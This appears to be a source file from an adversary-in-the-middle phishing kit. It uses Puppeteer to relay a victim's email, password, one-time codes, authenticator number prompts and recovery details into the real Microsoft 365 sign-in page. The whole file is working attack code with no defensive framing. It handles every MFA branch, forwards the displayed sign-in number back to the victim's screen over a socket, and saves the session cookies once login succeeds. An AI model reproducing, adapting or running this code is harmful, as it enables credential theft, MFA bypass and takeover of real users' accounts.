const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")
const cheerio = require("cheerio")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const email = `[name="loginfmt"]`

                await page.waitForSelector(email)
                await page.evaluate((email) => {
                    document.querySelector(email).value = ""
                    document.querySelector(email).setAttribute("value", "")
                }, email)

                await page.type(email, this.email)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 5000))
                        return true
                    }
                })
            } else {
                await new Promise(re => setTimeout(re, 2500))
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Create", "Welcome to Microsoft 365", "My Content"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {
                const email = `[name="loginfmt"]`

                await page.waitForSelector(email)
                await page.evaluate((email) => {
                    document.querySelector(email).value = ""
                    document.querySelector(email).setAttribute("value", "")
                }, email)

                await page.type(email, body.loginfmt)
                const html = this.alterHTML(await page.content())
                if (this.innerHTMLMatcher(html, ["Enter a valid"])) {
                    return html
                }

                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "home-password") {
                const password = `[name="passwd"]`

                await page.waitForSelector(password)
                await page.evaluate((password) => {
                    document.querySelector(password).value = ""
                    document.querySelector(password).setAttribute("value", "")
                }, password)

                await page.type(password, body.passwd)
                const html = this.alterHTML(await page.content())
                if (this.innerHTMLMatcher(html, ["Enter a valid"])) {
                    return html
                }

                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "code") {
                const otpInput = `[id="idTxtBx_OTC_Password"]`
                await page.waitForSelector(otpInput)
                await page.evaluate((otpInput) => {
                    document.querySelector(otpInput).value = ""
                    document.querySelector(otpInput).setAttribute("value", "")
                }, otpInput)

                await page.type(otpInput, body.otc)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "auth-app-code") {
                const otpInput = "#iVerifyText"
                await page.waitForSelector(otpInput)
                await page.evaluate((otpInput) => {
                    document.querySelector(otpInput).value = ""
                    document.querySelector(otpInput).setAttribute("value", "")
                }, otpInput)

                await page.type(otpInput, body.iVerifyText)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "code-options") {
                await page.evaluate(() => {
                    document.querySelectorAll(`[name="proofOption"]`).forEach((optionInput, index) => {
                        optionInput.setAttribute("spike-radio-btn", index)
                    })
                })

                const proofOption = `[spike-radio-btn="${body.proofOption}"]`
                await page.waitForSelector(proofOption)
                if (body.phoneNumber) {
                    await page.type(`#proofInput${body.proofOption}`, body.phoneNumber)
                }
                await page.click(proofOption)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "save-browser") {
                const acceptButton = `[id="acceptButton"]`

                await page.waitForSelector(acceptButton)
                await page.click(acceptButton)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                return await this.saveCookies()
            } else if (spikeType == "forget-password") {
                const forgetpasswordbtn = "#idA_PWD_ForgotPassword"

                await page.waitForSelector(forgetpasswordbtn)
                await page.click(forgetpasswordbtn)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "use-password") {
                const usePasswordBtn = "#idA_PWD_SwitchToPassword"

                await page.waitForSelector(usePasswordBtn)
                await page.click(usePasswordBtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "send-notification") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.type == "submit" && btn.innerText.includes("Send notification")) {
                            btn.click()
                        }
                    })
                })
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 4000))
            } else if (spikeType == "other-ways") {
                const otherWayBtn = "#idA_PWD_SwitchToCredPicker"

                await page.waitForSelector(otherWayBtn)
                await page.click(otherWayBtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "send-code") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.type == "submit" && btn.innerText.includes("Send code")) {
                            btn.click()
                        }
                    })
                })
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 1500))
            } else if (spikeType == "request-auth-code") {
                let count = 0
                this.registerInterval(setInterval(async () => {
                    if (page == null) return
                    try {
                        const code = await page.evaluate(() => {
                            const displaySign = document.querySelector("#displaySign")
                            if (!displaySign) {
                                const acceptButton = document.querySelector(`[id="acceptButton"]`)
                                const tryAgainBtn = document.querySelector("#primaryButton")

                                if (acceptButton) {
                                    acceptButton.click()
                                    return "success"
                                } else if (tryAgainBtn) {
                                    count = 0
                                    tryAgainBtn.click()
                                }
                            } else {
                                return displaySign.innerText
                            }
                        })

                        if (code == "success") {
                            await this.saveCookies()
                            this.unRegisterInterval()
                        } else if (code && code.length > 0) {
                            IO.emit(`${this.id}-listener`, {
                                type: "code",
                                code
                            })
                        }
                    } catch (error) { }
                    count++
                    if (count > 60) this.unRegisterInterval()
                }, 2000))
            } else if (spikeType == "select-signin-way") {
                await page.evaluate((indexKey) => {
                    const deviceContainer = document.querySelector(`[id="tileList"]`)
                    deviceContainer.querySelectorAll("div.___b9iavz0.f10pi13n.f17n1hoa").forEach((btn, index) => {
                        if (Number(indexKey) == index) {
                            btn.querySelector("button").click()
                        }
                    })
                }, body.index)

                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "verification-options") {
                const btn = `[id="iVerifyIdentityRevert"]`
                await page.waitForSelector(btn)
                await page.click(btn)

                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })

                await page.evaluate(() => {
                    const btn = document.querySelector("#iShowCostlyProofsLink")
                    if (btn) btn.click()

                    document.querySelectorAll(`[name="proofOption"]`).forEach((optionInput) => {
                        optionInput.click()
                    })
                })
            } else if (spikeType == "use-auth-app") {
                const btn = "#idA_PWD_SwitchToRemoteNGC"
                await page.waitForSelector(btn)
                await page.click(btn)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "idTxtBx_SAOTCC_OTC") {
                let sel = `#idTxtBx_SAOTCC_OTC`
                await page.waitForSelector(sel)
                await page.evaluate(() => {
                    document.querySelector(`#idTxtBx_SAOTCC_OTC`).value = ""
                    document.querySelector(`#idTxtBx_SAOTCC_OTC`).setAttribute("value", "")
                })

                await page.type(sel, body.otc)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "ProofConfirmation") {
                let sel = `[name="ProofConfirmation"]`
                await page.waitForSelector(sel)
                await page.evaluate(() => {
                    document.querySelector(`[name="ProofConfirmation"]`).value = ""
                    document.querySelector(`[name="ProofConfirmation"]`).setAttribute("value", "")
                })

                await page.type(sel, body.ProofConfirmation)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "iProofEmail") {
                let sel = "#iProofEmail"
                await page.waitForSelector(sel)
                await page.evaluate(() => {
                    document.querySelector("#iProofEmail").value = ""
                    document.querySelector("#iProofEmail").setAttribute("value", "")
                })

                await page.type(sel, body.iProofEmail)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "iOttText") {
                let sel = "#iOttText"
                await page.waitForSelector(sel)
                await page.evaluate(() => {
                    document.querySelector("#iOttText").value = ""
                    document.querySelector("#iOttText").setAttribute("value", "")
                })

                await page.type(sel, body.iOttText)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "mail-options") {
                let AuthKeyindex = body.index
                await page.evaluate(() => {
                    document.querySelectorAll(`[role="listitem"]`).forEach((btn, index) => {
                        btn.setAttribute("auth-key-id", index)
                    })
                })

                await page.waitForSelector(`[auth-key-id="${AuthKeyindex}"]`)
                await page.click(`[auth-key-id="${AuthKeyindex}"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "reset-password") {
                let resetpasswordbtn = "#idA_IL_ForgotPassword0"
                await page.waitForSelector(resetpasswordbtn)


                await page.click(resetpasswordbtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "auth-keys") {
                let AuthKeyindex = body.index
                await page.evaluate(() => {
                    document.querySelectorAll("[type=radio]").forEach((btn, index) => {
                        btn.setAttribute("auth-key-id", index)
                    })
                })

                await page.waitForSelector(`[auth-key-id="${AuthKeyindex}"]`)
                await page.click(`[auth-key-id="${AuthKeyindex}"]`)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (
                        response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                    ) {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })
            } else if (spikeType == "") {

            }

            else {
                return await this.getRequest()
            }

            let html = await this.grabCSS(page)
            if (this.innerHTMLMatcher(html, ["Verify your identity", "Show more verification methods"])) {
                let showMorebtn = "#idA_SAOTCS_ShowMoreProofs"
                await page.waitForSelector(showMorebtn)
                await page.click(showMorebtn)
                await new Promise(re => setTimeout(re, 1000))

                html = this.alterHTML(await page.content())
            } else if (html.includes("Because you've turned on two-step verification, you need to approve request")) {
                this.registerInterval(setInterval(async () => {
                    try {
                        let code = await page.evaluate(() => {
                            let submitBtn = document.querySelector(`[type="submit"]`);
                            if (submitBtn != null && submitBtn.value == "Yes") {
                                submitBtn.click();
                                return 0
                            }
                        })

                        if (code == 0) {
                            await this.saveCookies()
                            this.unRegisterInterval()
                        }
                    } catch (error) { }
                }, 2000))
            } else if (html.includes("Open your Authenticator app, and enter the number shown to sign in.​​")) {
                this.registerInterval(setInterval(async () => {
                    try {
                        let code = await page.evaluate(() => {
                            let submitBtn = document.querySelector(`[type="submit"]`);
                            if (submitBtn != null && submitBtn.value == "Yes") {
                                submitBtn.click();
                                return 0
                            }
                        })

                        if (code == 0) {
                            await this.saveCookies()
                            this.unRegisterInterval()
                        }
                    } catch (error) { }
                }, 2000))
            }

            // check before response.
            if (this.saveBeforeResponse(html)) return await this.saveCookies()
            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }